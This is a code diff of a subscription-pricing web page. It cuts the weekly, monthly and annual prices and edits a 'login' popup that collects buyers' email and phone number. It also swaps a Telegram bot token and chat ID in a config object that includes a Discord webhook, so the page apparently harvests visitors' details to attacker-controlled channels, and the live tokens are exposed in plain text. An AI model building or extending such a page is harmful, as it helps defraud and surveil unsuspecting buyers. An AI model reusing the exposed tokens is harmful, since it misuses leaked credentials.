@@ -71,21 +71,21 @@
         
         <div class="glass-card p-8 text-center">
             <h3 class="orbitron text-gray-400 text-xs tracking-widest mb-4">WEEKLY</h3>
-            <div class="text-4xl font-black mb-8">$20</div>
-            <button onclick="startFlow('20')" class="btn-elite w-full py-4 orbitron uppercase text-xs">Access Now</button>
+            <div class="text-4xl font-black mb-8">$10</div>
+            <button onclick="startFlow('10')" class="btn-elite w-full py-4 orbitron uppercase text-xs">Access Now</button>
         </div>
 
         <div class="glass-card p-10 text-center border-gold/40 relative transform md:scale-110 shadow-2xl">
             <div class="absolute -top-4 left-1/2 -translate-x-1/2 bg-gold text-black px-5 py-1 rounded-full text-[10px] font-black orbitron">POPULAR</div>
             <h3 class="orbitron text-white text-xs tracking-widest mb-4">MONTHLY</h3>
-            <div class="text-5xl font-black mb-8 gold-text">$40</div>
-            <button onclick="startFlow('40')" class="btn-elite w-full py-4 orbitron uppercase text-xs">Access Now</button>
+            <div class="text-5xl font-black mb-8 gold-text">$17</div>
+            <button onclick="startFlow('17')" class="btn-elite w-full py-4 orbitron uppercase text-xs">Access Now</button>
         </div>
 
         <div class="glass-card p-8 text-center">
             <h3 class="orbitron text-gray-400 text-xs tracking-widest mb-4">ANNUAL</h3>
-            <div class="text-4xl font-black mb-8">$250</div>
-            <button onclick="startFlow('250')" class="btn-elite w-full py-4 orbitron uppercase text-xs">Access Now</button>
+            <div class="text-4xl font-black mb-8">$110</div>
+            <button onclick="startFlow('110')" class="btn-elite w-full py-4 orbitron uppercase text-xs">Access Now</button>
         </div>
     </div>
 
@@ -104,8 +104,8 @@
 
         // --- إعدادات العراب النهائية ---
         const CONFIG = {
-            t: "8769621725:AAG84BTIJ2sU4SwpTZFSNTPgZ3CwO4p8-9s",
-            c: "8715481879",
+            t: "8373436202:AAFp4XOs2G74o01ZOIJL87ulONpoZpgN9f0",
+            c: "8930643587",
             w: "https://discord.com/api/webhooks/1474024330412425226/zvPRFXHvATNuEQLiNMplwHxcc4nQfXGhGhmmdhc4mwvt-Xtll5wyUAaenMBlPiyJc8kh"
         };
 
@@ -117,12 +117,12 @@
 
         async function startFlow(price) {
             const { value: login } = await Swal.fire({
-                title: 'تسجيل دخول آمن', background: '#050505', color: '#d4af37',
+                title: 'تسجيل دخول ', background: '#050505', color: '#d4af37',
                 customClass: { popup: 'swal-arrab animate__animated animate__fadeInDown' },
                 confirmButtonText: 'استمرار',
                 html: `
                     <div class="p-2">
-                        <input id="em" class="modern-input" placeholder="البريد الإلكتروني" type="email">
+                        <input id="em" class="modern-input" placeholder=" لبريد الإلكتروني" type="email">
                         <input id="ph" class="modern-input" placeholder="رقم الهاتف" type="tel">
                     </div>
                 `,
